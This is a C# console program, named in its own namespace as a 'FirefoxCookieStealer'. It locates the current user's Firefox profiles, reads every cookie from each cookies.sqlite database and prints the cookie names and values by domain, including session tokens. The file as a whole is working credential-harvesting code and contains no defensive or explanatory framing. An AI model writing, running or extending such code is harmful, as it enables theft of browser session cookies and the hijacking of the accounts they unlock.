using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Data.SQLite;

namespace FirefoxCookieStealer
{
    class Program
    {
        static void Main(string[] args)
        {
            String Path = @"C:\Users\" + Environment.UserName + @"\AppData\Roaming\Mozilla\Firefox\Profiles";

            List<MozCookie> AllCookies = new List<MozCookie>();
            Dictionary<String, List<MozCookie>> Domains = new Dictionary<string, List<MozCookie>>();

            DirectoryInfo ProfilesDirectory = new DirectoryInfo(Path);
            foreach (DirectoryInfo c in ProfilesDirectory.GetDirectories())
            {
                String cs = c.FullName + "\\cookies.sqlite";

                if (!File.Exists(cs))
                    continue;

                var con = new SQLiteConnection("URI=file:" + cs);
                con.Open();

                string stm = "SELECT * FROM moz_cookies";

                var cmd = new SQLiteCommand(stm, con);
                SQLiteDataReader rdr = cmd.ExecuteReader();

                while (rdr.Read())
                {
                    MozCookie mc = new MozCookie();
                    mc.ID = rdr.GetInt32(0);
                    mc.OriginAttributes = rdr.GetString(1);
                    mc.Name = rdr.GetString(2);
                    mc.Value = rdr.GetString(3);
                    mc.Host = rdr.GetString(4);
                    mc.Path = rdr.GetString(5);
                    mc.Expiry = rdr.GetInt32(6);
                    mc.LastAccessed = rdr.GetInt32(7);
                    mc.CreationTime = rdr.GetInt32(8);
                    mc.IsSecure = rdr.GetInt32(9);
                    mc.IsHttpOnly = rdr.GetInt32(10);
                    mc.IsBrowserElement = rdr.GetInt32(11);
                    mc.SameSite = rdr.GetInt32(12);
                    mc.RawSameSite = rdr.GetInt32(13);
                    mc.SchemeMap = rdr.GetInt32(14);

                    String temp = mc.Host;
                    temp = temp.TrimStart('.');
                    if (!temp.Contains(Uri.SchemeDelimiter))
                    {
                        temp = string.Concat(Uri.UriSchemeHttp, Uri.SchemeDelimiter, temp);
                    }
                    Uri uri = new Uri(temp);
                    string tld = uri.GetLeftPart(UriPartial.Authority);

                    //AllCookies.Add(mc);
                    if (!Domains.ContainsKey(tld))
                    {
                        List<MozCookie> NewList = new List<MozCookie>();
                        NewList.Add(mc);
                        Domains.Add(tld, NewList);
                    }
                    else
                    {
                        Domains[tld].Add(mc);
                    }
                }

                while (true) {
                    int k = 1;
                    List<String> domains = new List<string>();
                    foreach (var item in Domains)
                    {
                        Console.WriteLine(k.ToString() + ") " + item.Key);
                        domains.Add(item.Key);
                        k++;
                    }

                    Console.Write(">");
                    int selection = int.Parse(Console.ReadLine());

                    String key = domains.ToArray()[selection - 1];

                    Console.WriteLine("Host\tPath\tName\tValue");

                    foreach(var cookie in Domains[key])
                    {
                        Console.WriteLine(cookie.Host + "\t" + cookie.Path + "\t" + cookie.Name + "\t" + cookie.Value + "\t");
                    }
                    Console.ReadLine();
                }
            }
        }
    }
}
